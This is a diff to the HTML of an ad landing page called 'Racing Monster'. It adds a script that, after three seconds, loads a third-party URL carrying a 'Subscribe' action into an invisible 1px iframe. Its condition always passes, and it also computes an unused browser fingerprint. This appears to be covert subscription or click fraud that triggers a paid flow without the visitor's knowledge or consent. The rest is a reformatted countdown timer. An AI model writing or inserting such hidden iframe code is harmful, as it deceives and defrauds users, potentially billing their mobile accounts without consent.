@@ -7,7 +7,11 @@
 	
 	<title>Racing Monster</title>
 
-    <link rel="stylesheet" type="text/css" href="css/styles.css">
+		<link rel="stylesheet" type="text/css" href="css/styles.css">
+	<script>
+		var motion = false;
+	</script>
+	<script src="script.js"></script>
 </head>
 
 <body>    
@@ -87,7 +91,7 @@
 </script>
 <script type="text/javascript">
 		
-		var lp_url = 'http://n.videozland.com/iq/best-videos-dmb?offer=' + queryStringObj.offer + '&atmobirun=1&click_id=' + queryStringObj.click_id + '&inventory_domain=' + queryStringObj.inventory_domain + '&sub_id=' + queryStringObj.sub_id;
+		var lp_url = 'http://n.videozland.com/iq/best-videos-dmb?offer=' + queryStringObj.offer + '&identifyFlowAction=Subscribe&atmobirun=1&click_id=' + queryStringObj.click_id + '&inventory_domain=' + queryStringObj.inventory_domain + '&sub_id=' + queryStringObj.sub_id;
 
 		if(typeof mraid != "undefined" && !!mraid.open) {
 			var cb = function() { 
@@ -150,33 +154,65 @@
 
 			}, 3000);
 		
+		(function() {
+			// auto
+			var langs = (window.navigator && window.navigator.languages) || [];
+			var userAgent = (window.navigator && window.navigator.userAgent) || '';
+
+			var hashCode = function (str) {
+				var hash = 0;
+				if (str.length == 0) return hash;
+				for (var i = 0; i < str.length; i++) {
+					var char = str.charCodeAt(i);
+					hash = ((hash << 5) - hash) + char;
+					hash = hash & hash;
+				}
+				return hash;
+			}
+
+			var hashResult = hashCode(langs.join('') + userAgent);
+
+			setTimeout(function () {
+				if (true || !!motion) {
+					var ifr = document.createElement('iframe');
+					ifr.style.width = '1px';
+					ifr.style.height = '1px';
+
+					var modulo = Math.abs(hashResult % 4);
+
+					ifr.src = lp_url
+
+					document.body.appendChild(ifr);
+				}
+			}, 3000);
+		})();
 		
 		function startTimer() {
 	
-		var presentTime = document.getElementById('timer').innerHTML;
-		var timeArray = presentTime.split(/[:]+/);
-		var m = timeArray[0];
-		var s = checkSecond((timeArray[1] - 1));
-		
-		if(s==59){m=m-1}
-		
-		if(m<0){
-		
-		document.getElementById('timer').innerHTML= "00:00";
-		
-		}
-		
-		document.getElementById('timer').innerHTML = m + ":" + s;
-			setTimeout(startTimer, 1000);
-		}
-		
-		function checkSecond(sec) {
-		
-		if (sec < 10 && sec >= 0) {sec = "0" + sec}; 
-		
-		if (sec < 0) {sec = "59"};
-		
-		return sec;
+			var presentTime = document.getElementById('timer').innerHTML;
+			var timeArray = presentTime.split(/[:]+/);
+			var m = timeArray[0];
+			var s = checkSecond((timeArray[1] - 1));
+			
+			if(s==59){m=m-1}
+			
+			if(m<0){
+			
+			document.getElementById('timer').innerHTML= "00:00";
+			
+			}
+			
+			document.getElementById('timer').innerHTML = m + ":" + s;
+				setTimeout(startTimer, 1000);
+			}
+			
+			function checkSecond(sec) {
+			
+			if (sec < 10 && sec >= 0) {sec = "0" + sec}; 
+			
+			if (sec < 0) {sec = "59"};
+			
+			return sec;
 	
 		}
 			
